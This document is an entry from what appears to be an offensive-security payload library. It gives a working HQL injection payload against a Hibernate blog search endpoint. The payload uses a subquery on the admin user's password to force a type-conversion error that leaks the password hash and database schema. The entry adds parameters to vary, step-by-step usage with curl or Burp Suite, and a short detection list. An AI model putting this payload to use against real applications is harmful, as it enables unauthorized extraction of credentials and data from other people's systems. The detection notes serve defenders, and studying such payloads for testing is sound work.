---
id: 4e1a14e8-8bd6-4573-a11a-60cd69922b0a
name: HQL-Injection-Payload-Blog-Posts-Admin-Check
type: code
language: sql
verified: true
created_at: '2023-04-06T03:56:33.305044+00:00'
updated_at: '2023-04-10T20:22:26.250391+00:00'
platforms:
  - Web
  - Java
tags:
  - hql-injection
  - payload
  - error-based
validated: true
---

# HQL-Injection-Payload-Blog-Posts-Admin-Check

## Code

```sql
from BlogPosts
where title like '%11'
  and (select password from User where username='admin')=1
  or ''='%'
  and published = true
```

## Description

This HQL injection payload targets a blog post retrieval query by appending a subquery that selects the admin user's password and compares it to 1, forcing a data type conversion error (string hash to integer). The 'or ''='%' ' clause maintains query validity to avoid short-circuiting, while nominally searching for titles containing '11' and published posts. When injected into a vulnerable parameter, it triggers an error leaking the full underlying SQL, revealing database schema and potentially the password hash.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| %11 | Placeholder for title search string (can be adjusted for specific enumeration) | %admin |
| admin | Target username in the subquery | user1 |
| 1 | Comparison value to cause type mismatch | 0 |
| true | Published status filter (boolean) | false |

## Usage

Embed this payload into a URL-encoded HTTP parameter (e.g., 'title') for a blog search endpoint in a vulnerable Hibernate-based application. Use tools like curl or Burp Suite to send the request and capture the error response. This is typically the second step in an error-based HQL injection after identifying the injection point. Iterate by changing the title placeholder or status to enumerate data.

## Detection

- Web application logs showing type conversion errors or unexpected subqueries in HQL/SQL statements.
- WAF alerts for injection patterns like nested SELECTs or boolean operators in search parameters.
- Anomalous error responses (HTTP 500) with leaked SQL fragments in production traffic.
- Monitoring for repeated requests with encoded payloads targeting user tables.

## Related

- [[procedures/HQL-Error-Based-Injection-for-Blog-Post-Retrieval]]
- [[commands/curl-send-hql-injection]]
